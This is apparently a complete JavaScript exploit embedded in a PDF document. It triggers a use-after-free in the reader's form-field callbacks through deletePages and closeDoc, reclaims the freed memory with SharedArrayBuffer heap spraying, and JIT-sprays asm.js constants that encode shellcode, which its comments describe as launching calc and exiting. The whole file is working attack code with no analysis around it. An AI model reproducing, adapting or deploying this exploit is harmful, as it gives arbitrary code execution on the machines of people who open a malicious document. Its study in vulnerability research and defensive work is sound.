// store sprayed object
var sprayArr = [];

// store sprayed asm.js modules
var asmJsModulesArr = [];

// spray CalExec + ExitProcess shellcode
// VirtualAlloc of size 0x5000
function sprayJITShellcode(asmJsModuleName, payloadFuncName, ffiFuncName) {
  var script = `
        function ${asmJsModuleName} (stdlib, ffi, heap){
            'use asm';
            var ffi_func = ffi.func;

            function ${payloadFuncName} () {
                var val = 0;
                val = ffi_func(
                    0xa8909090|0,
                    0xa8909090|0,
                    0xa8909090|0,
                    0xa890d6ff|0,
                    0xa890006a|0,
                    0xa890d7ff|0,
                    0xa851056a|0,
                    0xa890e189|0,
                    0xa85161b5|0,
                    0xa89063b1|0,
                    0xa890636c|0,
                    0xa8b99051|0,
                    0xa8c9315e|0,
                    0xa850f631|0,
                    0xa890d6ff|0,
                    0xa890c789|0,
                    0xa8ff3157|0,
                    0xa851e189|0,
                    0xa85178b5|0,
                    0xa89045b1|0,
                    0xa8907469|0,
                    0xa8b99090|0,
                    0xa85172b5|0,
                    0xa89050b1|0,
                    0xa890636f|0,
                    0xa8b99090|0,
                    0xa85173b5|0,
                    0xa89065b1|0,
                    0xa8900073|0,
                    0xa8b99090|0,
                    0xa851c931|0,
                    0xa8d2ff53|0,
                    0xa851e189|0,
                    0xa85169b5|0,
                    0xa89057b1|0,
                    0xa890456e|0,
                    0xa8b99090|0,
                    0xa85165b5|0,
                    0xa89078b1|0,
                    0xa8900063|0,
                    0xa8b99090|0,
                    0xa851c931|0,
                    0xa8905f53|0,
                    0xa8ff315e|0,
                    0xa852f631|0,
                    0xa890da01|0,
                    0xa88e148b|0,
                    0xa890de01|0,
                    0xa81c728b|0,
                    0xa8909049|0,
                    0xa80e8b66|0,
                    0xa890ce01|0,
                    0xa890e1d1|0,
                    0xa890de01|0,
                    0xa824728b|0,
                    0xa8598deb|0,
                    0xa85905eb|0,
                    0xa804759d|0,
                    0xa89c0839|0,
                    0xa89064b5|0,
                    0xa89064b1|0,
                    0xa8906572|0,
                    0xa8b99090|0,
                    0xa804c083|0,
                    0xa827759d|0,
                    0xa89c0839|0,
                    0xa8906fb5|0,
                    0xa89072b1|0,
                    0xa8904163|0,
                    0xa8b99090|0,
                    0xa804c083|0,
                    0xa84a759d|0,
                    0xa89c0839|0,
                    0xa89065b5|0,
                    0xa89047b1|0,
                    0xa8905074|0,
                    0xa8b9d801|0,
                    0xa89051ad|0,
                    0xa841c931|0,
                    0xa890de01|0,
                    0xa820728b|0,
                    0xa890da01|0,
                    0xa878528b|0,
                    0xa890da01|0,
                    0xa83c538b|0,
                    0xa810588b|0,
                    0xa8ad96ad|0,
                    0xa814708b|0,
                    0xa80c408b|0,
                    0xa8008b64|0,
                    0xa858306a|0,
                    0xa890c931|0,
                    0xa8909090|0,
                    0x19b447a2|0,   // using predicated 19b40000 base
                )|0;
                return val|0;
            }
            return ${payloadFuncName};
        }

        function ${ffiFuncName} () {
            var x = 0;
            return x|0;
        } 
        for (var f=0; f<0x10; f++) { 
            asmJsModulesArr.push(${asmJsModuleName}(this, { func: ${ffiFuncName} }, 0)); 
        };
    `;
  eval(script);
  // required to generate jit code
  asmJsModulesArr[asmJsModulesArr.length - 1]();
}

// spray memory allocations
function reclaim(size, count) {
  for (var i = 0; i < count; i++) {
    sprayArr[i] = new SharedArrayBuffer(size);
    var rop = new DataView(sprayArr[i]);
    // control value for - call dword ptr [eax+74h]
    // first dword is pointer to the shellcode
    rop.setUint32(0, 0x2947b419);
    for (var j = 4; j < rop.byteLength / 4; j += 4) {
      rop.setUint32(j, 0x42424242);
    }
  }
}

// spray jit shellcode allocation
// 00005dbc: index to shellcode from the base of the VirtualAlloc
for (var jitCount = 0; jitCount < 3000; jitCount++) {
  sprayJITShellcode(
    "foo" + jitCount,
    "payload" + jitCount,
    "ffi_func" + jitCount
  );
}

// code to trigger vulnerability
var f0 = this.getField("field_15");
var f1 = this.getField("field_12");

f1.setAction("Format", "formatCallback()");
this.getField("field_10").setFocus();

function calculateCallback() {
  //trigger formatCallback on field 1
  f1.setItems([1]);

  // reclaim freed memory by spraying fixed allocations
  reclaim(0x58, 0x1000);
  reclaim(0x68, 0x1000);
}

function formatCallback() {
  // free object of size 0x68
  this.deletePages(0);
}

f0.setAction("Calculate", "calculateCallback()");

//close document to trigger vulnerability
this.closeDoc(true);
